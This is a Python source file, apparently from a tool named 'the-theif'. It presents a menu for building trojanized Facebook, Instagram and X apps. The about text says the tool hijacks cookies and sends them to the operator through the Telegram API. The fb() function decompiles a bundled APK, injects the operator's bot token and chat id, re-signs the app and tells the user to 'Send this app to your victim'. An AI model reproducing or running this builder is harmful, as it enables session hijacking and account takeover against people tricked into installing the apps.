def main():
    while True:
        banner()
        console.print(Panel.fit(
            "[bold yellow]A tool that can hijack cookies and transmit them to Telegram using the API.[/bold yellow]",
            title="Welcome"
        ))
        menu_table = Table(show_header=False, box=None)
        menu_table.add_row("[1] Facebook", "[4] Author")
        menu_table.add_row("[2] Instagram", "[5] More tools")
        menu_table.add_row("[3] X{twitter}", "[6] Configure")
        menu_table.add_row("[7] About", "[0] Exit")
        console.print(menu_table)

        choice = Prompt.ask("\n[\33[32;1m✓\33[0m] Choose one", choices=["0","1","2","3","4","5","6","7"], default="0")
        if choice == "1":
            fb()
        elif choice == "2":
            ig()
        elif choice == "3":
            tw()
        elif choice == "4":
            console.print("[blue]Opening Github...[/blue]")
            os.system("xdg-open https://github.com/Anon4You/")
            time.sleep(1)
        elif choice == "5":
            console.print("[blue]Opening Telegram...[/blue]")
            os.system("xdg-open https://t.me/nullxvoid")
            time.sleep(1)
        elif choice == "6":
            update_config_interactive()
        elif choice == "7":
            about()
            input("\nPress Enter to continue...")
        elif choice == "0":
            console.print("\n[cyan]Thanks for using this tool. Goodbye![/cyan]")
            time.sleep(1)
            sys.exit(0)

def about():
    """Display about information."""
    banner()
    console.print(Panel.fit(
        f"[bold]Package[/bold] : the-theif\n"
        f"[bold]Version[/bold] : {VERSION}\n\n"
        "Here's how this tool works:\n"
        "• Tool Functionality : The tool is designed to hijack cookies.\n"
        "• Data Transmission : It can transmit the hijacked cookies.\n"
        "• Communication Method : The transmission is done using the Telegram API.",
        title="About"
    ))
    input("\nPress Enter to return to main menu...")

def fb():
    # Get credentials before decompilation
    bot_token, chat_id = get_credentials()
    print("\33[33m")
    # Decompile with progress spinner
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task(description="Decompiling APK...", total=None)
        os.system("apkeditor d -i ${PREFIX}/share/the-theif/apks/fb.apk -o ~/theif")
    genapk(bot_token, chat_id)
    os.system("mv ~/signed.apk ~/the-theif/facebook.apk")

    banner()
    print("\n\n\33[36mYour apk file is saved as ~/the-theif/facebook.apk\n\33[32mSend this app to your victim...!\33[0m")
    sys.exit(0)

